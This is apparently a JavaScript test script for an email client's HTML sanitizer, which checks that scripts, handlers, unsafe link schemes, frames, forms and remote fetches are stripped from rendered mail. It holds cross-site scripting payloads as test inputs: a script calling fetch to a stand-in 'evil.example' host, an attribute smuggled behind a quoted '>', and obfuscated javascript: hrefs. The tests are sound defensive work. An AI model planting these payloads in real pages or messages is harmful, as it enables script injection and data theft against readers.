/**
 * Showing a stranger's email without letting it do anything.
 *
 * WHAT THIS IS FOR. Raptor used to flatten every message to text, which is safe and which made a
 * newsletter unreadable — the firm's own report: "it had pictures in it that I didn't download,
 * and there's links there that I should press on, but it doesn't work." The markup is now
 * rendered, in a frame that cannot run script and cannot fetch anything. sanitizeEmailHtml is the
 * one of those three layers that can be got wrong, so it is the one with a check beside it.
 *
 * Two different promises are being kept here and they fail in different directions:
 *
 *   NOTHING RUNS.      A handler, a javascript: href or a script tag that survives is a hole in a
 *                      page that holds a firm's client book. The sandbox blocks all three as
 *                      well, but a scan that quietly stopped working would never be noticed.
 *   NOTHING IS FETCHED until somebody asks. A remote picture tells its server the message was
 *                      opened, by whom and when — which in this trade tells a debtor's attorney
 *                      the letter landed and was read. The pictures that CAME with the message
 *                      cost nothing and are shown at once; the rest wait for the button.
 *
 * The one that is easy to get wrong is the tokeniser. `/<[^>]+>/` — the obvious way to find a tag
 * — ends the tag at a `>` inside a quoted value, which is the oldest way there is of smuggling an
 * attribute past a scan. That case is asserted below, and it is the reason this file parses
 * quotes instead of matching a regular expression.
 *
 * Run: node --import ./scripts/qa/tsresolve.mjs scripts/qa/check-email-html.mjs
 */
import { sanitizeEmailHtml } from '../../src/lib/emailHtml.ts'

let pass = 0
const failures = []
function check(name, actual, expected) {
  const a = JSON.stringify(actual)
  const b = JSON.stringify(expected)
  if (a === b) { pass += 1; return }
  failures.push(`${name}\n    expected ${b}\n    got      ${a}`)
}
const ok = (name, actual) => check(name, actual, true)

/** The message, minus the wrapper this module writes for itself. */
const bodyOf = (out) => out.html.slice(out.html.indexOf('<body>') + 6, out.html.indexOf('</body>'))
/** The wrapper's head, where the content policy and the link target live. */
const headOf = (out) => out.html.slice(0, out.html.indexOf('<body>'))

const LOGO = { cid: 'logo@bf', filename: 'logo.png', dataUri: 'data:image/png;base64,AAAA' }

/* ---------- nothing runs ---------- */

const scripted = sanitizeEmailHtml(
  '<p>Before</p><script>fetch("https://evil.example/steal")</script><p>After</p>',
)
ok('a script tag is gone', !/<script/i.test(scripted.html))
ok('...and so is what was inside it', !/evil\.example/.test(scripted.html))
ok('...and the prose around it survives', /Before/.test(scripted.html) && /After/.test(scripted.html))

const handler = sanitizeEmailHtml('<img src="cid:logo@bf" onerror="alert(1)" alt="Logo">',
  { images: [LOGO] })
ok('an event handler is dropped', !/onerror/i.test(handler.html))
ok('...and the picture it was hiding behind is still shown', /data:image\/png/.test(handler.html))

/*
 * THE TOKENISER'S REASON FOR EXISTING. A `>` inside the quoted value ends the tag as far as
 * /<[^>]+>/ is concerned, so a scan built on that regular expression sees `<img src="a>` as the
 * whole tag and leaves ` b" onload=...>` behind as text — which the browser then re-parses.
 */
const smuggled = sanitizeEmailHtml('<img src="https://evil.example/a>b" onload="alert(1)">')
ok('a handler hidden behind a > inside a quoted value is still found',
  !/onload/i.test(smuggled.html))

for (const href of [
  'javascript:alert(1)',
  'JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  'java&#115;cript:alert(1)',
  ' javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
]) {
  const out = sanitizeEmailHtml(`<a href="${href}">Press me</a>`)
  ok(`a link to ${JSON.stringify(href)} loses its href`, !/href=/.test(bodyOf(out)))
  ok('...and the words stay, so the message still reads', /Press me/.test(out.html))
}

const framed = sanitizeEmailHtml('<p>One</p><iframe src="https://evil.example"></iframe><p>Two</p>')
ok('an iframe is gone', !/<iframe/i.test(framed.html) && !/evil\.example/.test(framed.html))

const formed = sanitizeEmailHtml('<form action="https://evil.example"><input name="pw"></form><p>Hi</p>')
ok('a form and its fields are gone', !/<form|<input|evil\.example/i.test(formed.html))

/*
 * NESTING, WHICH A STACK GETS RIGHT AND A BOOLEAN DOES NOT.
 *
 * `<svg>` is dropped with everything inside it. A `</form>` in the middle closes the FORM, not the
 * svg — a flag, or a stack cleared on any close tag, treats it as the end of the drop and lets the
 * rest of the svg back into the document. So the assertion is about what comes AFTER the stray
 * close tag and before the real one: a tracking pixel and some markup, neither of which may
 * appear. Asserting only that the script is gone proves nothing here, because a script is dropped
 * on its own account whether the stack works or not.
 */
const nested = sanitizeEmailHtml(
  '<svg><form></form><img src="https://track.example/pixel.gif"><p>Inside the svg</p></svg>'
  + '<script>alert(1)</script><p>End</p>',
)
ok('a close tag inside a dropped element does not let the rest of it back in',
  !/Inside the svg/.test(nested.html))
ok('...nor the pixel that was in there with it',
  !/track\.example/.test(nested.html) && nested.blockedRemote === 0)
ok('...and nothing runs either way', !/alert\(1\)/.test(nested.html))
ok('...and the message after it is still there', /End/.test(nested.html))

const commented = sanitizeEmailHtml('<!--[if mso]><script>alert(1)</script><![endif]--><p>Body</p>')
ok('a conditional comment is dropped whole', !/alert\(1\)/.test(commented.html))
ok('...and the message survives it', /Body/.test(commented.html))

/* ---------- the links work ---------- */

const linked = sanitizeEmailHtml(
  '<a href="https://businesstech.co.za/news/12345/?a=1&amp;b=2">Read the article</a>',
)
ok('a real link keeps its address', /href="https:\/\/businesstech\.co\.za\/news\/12345\/\?a=1&amp;b=2"/
  .test(linked.html))
ok('...and opens away from Raptor', /target="_blank"/.test(bodyOf(linked)))
ok('...without handing the page a way back', /rel="noopener noreferrer"/.test(linked.html))
ok('...and every link does, by default as well', /<base target="_blank">/.test(headOf(linked)))
ok('the message may not set a base of its own',
  !/<base href/i.test(sanitizeEmailHtml('<base href="https://evil.example/">x').html))

for (const scheme of ['mailto:info@bredellferreira.co.za', 'tel:+27215550130', '#section']) {
  ok(`a ${scheme.split(':')[0]} link survives`,
    sanitizeEmailHtml(`<a href="${scheme}">x</a>`).html.includes(`href="${scheme}"`))
}

/* ---------- the pictures that came with the message ---------- */

const signed = sanitizeEmailHtml('<p>Regards</p><img src="cid:logo@bf" alt="Bredell Ferreira">',
  { images: [LOGO] })
check('a cid picture is swapped for the bytes already in hand',
  /src="([^"]+)"/.exec(signed.html)?.[1], LOGO.dataUri)
check('...and is reported as placed, so the pane does not list it twice',
  signed.usedCids, ['logo@bf'])
check('...and nothing was refused', signed.blockedRemote, 0)

/* The header writes a cid in angle brackets and the markup writes it without. Same picture. */
const bracketed = sanitizeEmailHtml('<img src="cid:logo@bf">', { images: [{ ...LOGO, cid: '<logo@bf>' }] })
ok('a cid in angle brackets still matches the markup', bracketed.html.includes(LOGO.dataUri))

const missing = sanitizeEmailHtml('<img src="cid:gone@bf" alt="Signature">')
ok('a cid that never arrived does not keep pointing at nothing', !/cid:/.test(bodyOf(missing)))
ok('...and is marked, so the gap is drawn rather than silent', /data-blocked/.test(missing.html))
/*
 * A src-less <img> draws the browser's own broken-picture glyph, which says Raptor is faulty. A
 * transparent pixel in a box drawn by the stylesheet says the picture is simply not here.
 */
ok('...standing in as a transparent pixel, not as a broken one',
  /src="data:image\/gif;base64,[A-Za-z0-9+/=]+" data-blocked/.test(missing.html))

/* ---------- and the ones that would cost a request ---------- */

const tracked = sanitizeEmailHtml(
  '<p>Hello</p><img src="https://track.example/open.gif?id=42" width="1" height="1">'
  + '<img src="https://cdn.example/banner.jpg">',
)
ok('a remote picture is not fetched', !/track\.example|cdn\.example/.test(tracked.html))
ok('...and it leaves a hole to say so', /data-blocked/.test(tracked.html))
/*
 * THE PIXEL IS NOT A PICTURE and is not counted as one. Counted, it would put "pictures in this
 * message were not downloaded" on a message whose only remote picture is one nobody can see —
 * a warning that fires when nothing is wrong, which is how people learn to stop reading them.
 */
check('...and only the one a person could actually see is counted', tracked.blockedRemote, 1)
check('...the tracking pixel being dropped outright rather than held back',
  (tracked.html.match(/<img/g) ?? []).length, 1)
ok('...and the content policy refuses them as well, whatever this scan missed',
  /img-src data:(?!.*https)/.test(headOf(tracked)))

/*
 * DROPPED EVEN ONCE PICTURES ARE ASKED FOR. Somebody asking to see the pictures is asking to see
 * the pictures — not for the sender to be told they read it.
 */
const trackedShown = sanitizeEmailHtml(
  '<img src="https://track.example/open.gif?id=42" width="1" height="1">', { showPictures: true },
)
ok('a tracking pixel is never fetched, whatever the reader asked for',
  !/track\.example/.test(trackedShown.html))

const shown = sanitizeEmailHtml(
  '<img src="https://cdn.example/banner.jpg">', { showPictures: true },
)
ok('once the reader asks, the picture is fetched', /src="https:\/\/cdn\.example\/banner\.jpg"/.test(shown.html))
check('...and nothing is left to offer', shown.blockedRemote, 0)
ok('...and the policy opens exactly that far', /img-src data: https: http:/.test(headOf(shown)))
ok('...and no further: still no script, style or frame',
  /default-src 'none'/.test(headOf(shown)))

/* A protocol-relative URL is a remote fetch written another way. */
const relative = sanitizeEmailHtml('<img src="//cdn.example/banner.jpg">')
ok('a protocol-relative picture counts as remote too',
  !/cdn\.example/.test(relative.html) && relative.blockedRemote === 1)

/* ---------- the stylesheet, which is how bulk mail is written ---------- */

const styled = sanitizeEmailHtml(
  '<style>@import url("https://fonts.example/f.css");'
  + '.hero{background-image:url(https://cdn.example/hero.jpg);color:#123456}</style>'
  + '<div class="hero" style="background:url(cid:logo@bf) no-repeat;padding:8px">Hi</div>',
  { images: [LOGO] },
)
ok('the stylesheet is kept, because the layout is in it', /<style>/.test(styled.html))
ok('...and its own colours with it', /#123456/.test(styled.html))
ok('...but an @import fetches a stylesheet, so it goes', !/@import|fonts\.example/.test(styled.html))
ok('...and a remote background is refused like any other picture',
  !/cdn\.example/.test(styled.html) && styled.blockedRemote === 1)
ok('...while a background that came with the message is drawn', styled.html.includes(LOGO.dataUri))
ok('...and the cell keeps its size rather than collapsing', /url\("about:blank"\)/.test(styled.html))
ok('...and its padding, which is the layout', /padding:8px/.test(styled.html))

ok('a declaration that runs code is defused',
  !/expression\(/i.test(sanitizeEmailHtml('<div style="width:expression(alert(1))">x</div>').html))

/* ---------- the wrapper ---------- */

const wrapped = sanitizeEmailHtml('<p>Hi</p>')
ok('nothing may be fetched at all by default', /default-src 'none'/.test(headOf(wrapped)))
ok('inline style is allowed, because that is how mail is written',
  /style-src 'unsafe-inline'/.test(headOf(wrapped)))
ok('the frame is told nothing about where it is being read',
  /<meta name="referrer" content="no-referrer">/.test(headOf(wrapped)))
ok('and it is a whole document, which is what srcdoc takes', wrapped.html.startsWith('<!doctype html>'))

/* ---------- prose is left alone ---------- */

const prose = sanitizeEmailHtml('<p>5 &lt; 6, and 7 &gt; 6</p><p>R25 &amp; R3,50</p>')
ok('entities in the text are not touched', /5 &lt; 6/.test(prose.html) && /R25 &amp; R3,50/.test(prose.html))
const bare = sanitizeEmailHtml('<p>5 < 6</p>')
ok('a bare < in prose is prose, not a tag', /5 &lt; 6|5 < 6/.test(bare.html))

if (failures.length) {
  console.log(`\n${failures.length} FAILED:\n`)
  for (const f of failures) console.log('  ✗ ' + f + '\n')
  process.exit(1)
}
console.log(`${pass} passed, 0 failed`)
console.log(`
A message's own markup now reaches the screen: the links carry their addresses and open away from
Raptor, and the signature that came with the message is drawn in place. Nothing runs — scripts,
handlers and javascript: hrefs are gone, including the one hidden behind a > inside a quoted value
— and nothing is fetched from anybody else's server until a person presses the button, enforced
twice over by the scan and by the document's own content policy.`)
